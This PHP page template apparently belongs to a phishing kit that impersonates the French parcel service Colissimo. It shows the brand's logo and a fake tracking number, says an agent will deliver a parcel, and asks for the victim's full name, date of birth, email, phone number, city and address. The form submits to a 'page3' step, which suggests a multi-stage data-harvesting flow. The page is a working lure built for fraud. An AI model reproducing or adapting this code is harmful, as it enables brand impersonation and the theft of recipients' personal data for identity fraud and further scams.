<?php
require_once 'config/panel.php';

ob_start();
?>

<div class="w-100 d-flex flex-column justify-content-center align-items-center bg-white p-3">


     <form class="container p-3 my-3 carda shadow rounded-3" action="index.php?<?= md5(time()) ?>" method="post">
     <input type="hidden" name="catch">
     <div class="d-flex flex-row justify-content-start align-items-center"> 
    <img style="width: 118px;" src="assets/images/logo-colissimo.svg" alt="" srcset="">
    <h2 class="m-0" style="font-size: 18px;color:#20458F;font-family:bold-font;padding-left:10px;">N°<?= TRACK; ?></h2>
</div>
<div class="d-flex flex-row justify-content-start align-items-center">
    <p class=" m-0" style="font-size: 12px;color:#3c3c3c;">N° de suivi étranger : </p>
    <h2 class=" m-0" style="font-size: 12px;color:#20458F;font-family:bold-font;padding-left:10px;"> N°<?= TRACK; ?></h2>
</div>
<img class="my-3 w-100"  src="assets/images/sep.png" alt="" srcset="">
     <div class="mt-3">
      <h6>L'agent vous contactera dès que possible pour vous livrer votre colis.</h6>
      <p style="font-size: 12.8px;color:#4d677a;">Veuillez fournir les informations suivantes</p>
     </div>
     
      <div  class="form-floating my-3">
          <input style="border-radius:0;" type="text" class="form-control <?php if ($_SESSION['ERRORS']['name']) { echo 'is-invalid'; } ?>" id="floatingPassword" name="name" placeholder="Veuillez saisir le code reçu" value="<?php if (!empty($_SESSION['sname'])){ echo $_SESSION['sname'];} ?>">
          <label style="color:#4d677a;" for="floatingPassword">Nom et prénom*</label>
          <div class="invalid-feedback">Ce champ est obligatoire</div>
         </div>
         <div  class="form-floating my-3">
          <input style="border-radius:0;" type="tel" class="date form-control <?php if ($_SESSION['ERRORS']['dob']) { echo 'is-invalid'; } ?>" id="floatingPassword" name="dob" placeholder="Veuillez saisir le code reçu" value="<?php if (!empty($_SESSION['sdob'])){ echo $_SESSION['sdob'];} ?>">
          <label style="color:#4d677a;" for="floatingPassword">Date de naissance*</label>
          <div class="invalid-feedback">Ce champ est obligatoire</div>
          </div>
         <div  class="form-floating my-3">
          <input style="border-radius:0;" type="text" class="form-control <?php if ($_SESSION['ERRORS']['email']) { echo 'is-invalid'; } ?>" id="floatingPassword" name="email" placeholder="Veuillez saisir le code reçu" value="<?php if (!empty($_SESSION['semail'])){ echo $_SESSION['semail'];} ?>">
          <label style="color:#4d677a;" for="floatingPassword">Courriel*</label>
          <div class="invalid-feedback">Ce champ est obligatoire</div>
          </div>
         <div  class="form-floating my-3">
          <input style="border-radius:0;" type="text" class="form-control <?php if ($_SESSION['ERRORS']['phone']) { echo 'is-invalid'; } ?>" id="floatingPassword" name="phone" placeholder="Veuillez saisir le code reçu" value="<?php if (!empty($_SESSION['sphone'])){ echo $_SESSION['sphone'];} ?>">
          <label style="color:#4d677a;" for="floatingPassword">Téléphone*</label>
          <div class="invalid-feedback">Ce champ est obligatoire</div>
         </div>
         <div  class="form-floating my-3">
          <input style="border-radius:0;" type="text" class="form-control <?php if ($_SESSION['ERRORS']['city']) { echo 'is-invalid'; } ?>" id="floatingPassword" name="city" placeholder="Veuillez saisir le code reçu" value="<?php if (!empty($_SESSION['scity'])){ echo $_SESSION['scity'];} ?>">
          <label style="color:#4d677a;" for="floatingPassword">Ville*</label>
          <div class="invalid-feedback">Ce champ est obligatoire</div>
         </div>
         <div  class="form-floating my-3">
          <input style="border-radius:0;"  type="text" class="form-control <?php if ($_SESSION['ERRORS']['zip']) { echo 'is-invalid'; } ?>" id="floatingPassword" name="zip" placeholder="Veuillez saisir le code reçu" value="<?php if (!empty($_SESSION['szip'])){ echo $_SESSION['szip'];} ?>">
          <label style="color:#4d677a;" for="floatingPassword">Adresse et code postal*</label>
          <div class="invalid-feedback">Ce champ est obligatoire</div>
         </div>

         <div>
            <p style="font-size: 12.8px;color:#4d677a;">Les champs marqués d'un astérisque (*) sur ce formulaire sont obligatoires car nous avons besoin de ces informations pour traiter votre commande.</p>
         </div>

         <div class="w-100 d-flex justify-content-end align-items-center">
 <button name="submit" value="page3" type="submit" style="font-family: bold-font;width:136px;font-size:14px;background-color:#ffc905;" class="btn btn-warning my-3 p-3 rounded-3">Continuer</button>
 </div>
    </form>


    <script src="assets/js/cleave.js"></script>
    <script src="assets/js/mainDate.js"></script>
</div>

<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout.php' ?>